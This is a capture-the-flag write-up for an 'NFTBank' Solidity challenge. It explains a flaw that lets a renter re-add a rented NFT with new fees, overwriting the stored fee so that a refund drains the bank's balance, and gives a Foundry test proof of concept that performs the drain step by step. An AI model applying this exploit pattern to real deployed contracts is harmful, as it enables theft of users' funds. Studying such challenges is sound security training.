# Analysis
  The bank allows rented NFT to be added again, which is the key to this challenge. Attacker can add that token with different fee, the old fee will be overridden, the `refund` will send arbitrary fee to the attacker, in this way attacker can drain all the balance .

# Steps
1. rent another Token 2
2. `addNFT(Token 2)` with 0 daily fee and 1000 gwei start fee(500 each for renting token 1/2. The fee values for Token 2 is overridden)
3. `getBackNft(Token 2)`, claim the owner of Token 2, for next step
4. `refund(Token 2)`, to get the 1000 gwei

# POC
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {NFTBank} from "../src/NFTBank.sol";
import {ERC721} from "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "openzeppelin-contracts/contracts/access/Ownable.sol";

contract CryptoKitties is ERC721("CryptoKitties", "MEOW"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

contract NFTBankHack is Test {
	NFTBank bank;
	CryptoKitties meow;
	address nftOwner = makeAddr("nftOwner");
	address attacker = makeAddr("attacker");

	function setUp() public {
		vm.startPrank(nftOwner);
		bank = new NFTBank();
		meow = new CryptoKitties();
		for (uint i; i < 10; i++) {
			meow.mint(nftOwner, i);
			meow.approve(address(bank), i);
			bank.addNFT(address(meow), i, 2 gwei, 500 gwei);
		}
		vm.stopPrank();
	}


	function test() public {
		vm.deal(attacker, 1 ether);
		vm.startPrank(attacker);
		bank.rent{value: 500 gwei}(address(meow), 1);
		vm.warp(block.timestamp + 86400 * 10);

		//solution       

		bank.rent{value: 500 gwei}(address(meow), 2);
		meow.approve(address(bank), 2);
		bank.addNFT(address(meow), 2, 0 gwei, 1000 gwei);
		bank.getBackNft(address(meow), 2, payable(address(this)));
		meow.approve(address(bank), 2);
		bank.refund{value: 0 gwei}(address(meow), 2);


		vm.stopPrank();
		assertEq(attacker.balance, 1 ether);
		assertEq(meow.ownerOf(1), attacker);
	}
}


```
